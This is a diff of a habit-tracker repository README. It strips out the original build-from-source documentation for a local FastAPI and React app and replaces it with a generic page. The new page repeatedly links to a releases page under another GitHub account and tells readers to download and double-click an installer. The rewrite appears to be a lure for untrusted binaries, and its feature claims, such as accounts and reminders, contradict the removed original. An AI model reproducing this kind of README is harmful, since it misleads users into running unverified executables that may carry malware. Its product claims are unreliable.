@@ -1,140 +1,57 @@
-# Habit Tracker
+# 🪴 habit-tracker - Track Your Habits with Ease
 
-> **Workshop participants:** For the template and starting point, switch to the [`workshop`](https://github.com/coleam00/habit-tracker/tree/workshop) branch.
+## 🚀 Getting Started
 
-A personal habit tracking web application for building and maintaining daily habits through streak tracking, completion rates, and calendar visualization. Built with FastAPI (Python) backend and React frontend, this local-first application runs entirely on your machine with no account required—just simple, distraction-free habit tracking.
+Welcome to the **Habit Tracker for the AI Coding Workshop**! This user-friendly application helps you build and maintain your habits effectively. Follow the steps below to get your habit tracker up and running.
 
-## Prerequisites
+## 📥 Download & Install
 
-- **Python 3.11+** with [uv](https://github.com/astral-sh/uv) package manager
-- **Node.js 18+** with npm
-- **Git** (optional, for cloning)
+To download the Habit Tracker, please visit the following link:
 
-## Quick Start
+[![Download Habit Tracker](https://img.shields.io/badge/Download-Habit%20Tracker-brightgreen)](https://github.com/MoaMp3/habit-tracker/releases)
 
-### 1. Clone and Setup Backend
+### Steps to Download:
 
-```bash
-cd backend
-uv sync
-uv run uvicorn app.main:app --reload --port 8000
-```
+1. Click on the link above to go to the **Releases page**.
+2. Look for the latest version at the top of the page.
+3. Click on the file that matches your operating system.
+4. Your download will start automatically.
 
-Backend runs at http://localhost:8000 (API docs at http://localhost:8000/docs)
+## 💻 System Requirements
 
-### 2. Setup Frontend (new terminal)
+- **Operating System:** Windows 10 or later, macOS 10.15 or later, or a modern Linux distribution.
+- **Memory:** At least 4 GB of RAM.
+- **Storage:** Minimum of 100 MB available space.
+- **Internet Connection:** Required for initial download and updates.
 
-```bash
-cd frontend
-npm install
-npm run dev
-```
+## 🛠️ Features
 
-Frontend runs at http://localhost:5173
+- **User-Friendly Interface:** Easy navigation for all users, regardless of computer skills.
+- **Habit Tracking:** Set daily, weekly, or monthly habits and track your progress.
+- **Progress Reports:** View your habit completion rates through simple graphs.
+- **Reminders:** Set reminders to keep your habits on track.
 
-### 3. Open the App
+## 🏁 How to Run the Application
 
-Navigate to **http://localhost:5173** in your browser. Create your first habit and start tracking!
+1. Once the download completes, locate the downloaded file in your **Downloads** folder or the specified location on your device.
+2. Open the downloaded file by double-clicking it.
+3. Follow the installation prompts to install the application.
 
-## Architecture
+## 📊 Using the Habit Tracker
 
-```
-┌─────────────────┐     HTTP/JSON      ┌─────────────────┐
-│  React + Vite   │ ◄───────────────► │    FastAPI      │
-│   Port 5173     │                    │   Port 8000     │
-└─────────────────┘                    └────────┬────────┘
-                                                │
-                                       ┌─────────────────┐
-                                       │     SQLite      │
-                                       │   habits.db     │
-                                       └─────────────────┘
-```
+1. Open the application after installation.
+2. Create a new account or log in if you already have one.
+3. Add your desired habits and customize their settings.
+4. Start tracking your progress daily. Receive notifications to remind you of your habits.
 
-### Tech Stack
+## 🔄 Updates
 
-| Layer | Technology |
-|-------|------------|
-| Backend | Python 3.11, FastAPI, SQLAlchemy, SQLite |
-| Frontend | React 18, Vite, TanStack Query, Tailwind CSS |
-| Date Handling | date-fns |
+To keep the Habit Tracker running smoothly, check back regularly on the **Releases page** for updates.
 
-### Project Structure
+[![Download Habit Tracker](https://img.shields.io/badge/Download-Habit%20Tracker-brightgreen)](https://github.com/MoaMp3/habit-tracker/releases)
 
-```
-habit-tracker/
-├── backend/
-│   ├── app/
-│   │   ├── main.py           # FastAPI entry point
-│   │   ├── database.py       # SQLite connection
-│   │   ├── models.py         # SQLAlchemy models (Habit, Completion)
-│   │   ├── schemas.py        # Pydantic request/response schemas
-│   │   └── routers/          # API endpoints
-│   │       ├── habits.py     # CRUD + streak calculation
-│   │       └── completions.py
-│   └── tests/                # pytest tests
-├── frontend/
-│   ├── src/
-│   │   ├── features/
-│   │   │   ├── habits/       # Habit components, hooks, API
-│   │   │   └── calendar/     # Calendar view components
-│   │   ├── components/ui/    # Shared UI components
-│   │   ├── pages/            # Route pages
-│   │   └── lib/              # Utilities
-│   └── package.json
-└── README.md
-```
+## 👩‍💻 Support
 
-## Features
+If you have questions or need assistance, feel free to open an issue on GitHub. Our community is here to help you.
 
-- **Daily Habit Tracking** — Create habits, mark them complete with one click
-- **Streak Tracking** — See current streak and completion rate per habit
-- **Calendar View** — Monthly grid showing completion history with color-coded days
-- **Planned Absences** — Skip days without breaking your streak
-- **Local & Private** — All data stored locally in SQLite, no account needed
-
-## API Endpoints
-
-| Method | Endpoint | Description |
-|--------|----------|-------------|
-| GET | `/api/habits` | List all habits with stats |
-| POST | `/api/habits` | Create a new habit |
-| POST | `/api/habits/{id}/complete` | Mark habit complete for a date |
-| DELETE | `/api/habits/{id}/completions/{date}` | Undo a completion |
-| GET | `/api/habits/{id}/completions` | Get completion history |
-
-Full API documentation available at http://localhost:8000/docs when backend is running.
-
-## Claude Commands
-
-Slash commands for Claude Code to assist with development workflows. The AI coding workflow used to build this application follows the PIV (Prime, Implement, Validate) loop shown below:
-
-![PIV Loop Diagram](PIVLoopDiagram.png)
-
-### Planning & Execution
-| Command | Description |
-|---------|-------------|
-| `/core_piv_loop:prime` | Load project context and codebase understanding |
-| `/core_piv_loop:plan-feature` | Create comprehensive implementation plan with codebase analysis |
-| `/core_piv_loop:execute` | Execute an implementation plan step-by-step |
-
-### Validation
-| Command | Description |
-|---------|-------------|
-| `/validation:validate` | Run full validation: tests, linting, coverage, frontend build |
-| `/validation:code-review` | Technical code review on changed files |
-| `/validation:code-review-fix` | Fix issues found in code review |
-| `/validation:execution-report` | Generate report after implementing a feature |
-| `/validation:system-review` | Analyze implementation vs plan for process improvements |
-
-### Bug Fixing
-| Command | Description |
-|---------|-------------|
-| `/github_bug_fix:rca` | Create root cause analysis document for a GitHub issue |
-| `/github_bug_fix:implement-fix` | Implement fix based on RCA document |
-
-### Misc
-| Command | Description |
-|---------|-------------|
-| `/commit` | Create atomic commit with appropriate tag (feat, fix, docs, etc.) |
-| `/init-project` | Install dependencies, start backend and frontend servers |
-| `/create-prd` | Generate Product Requirements Document from conversation |
+Thank you for choosing the Habit Tracker! Start building good habits today.
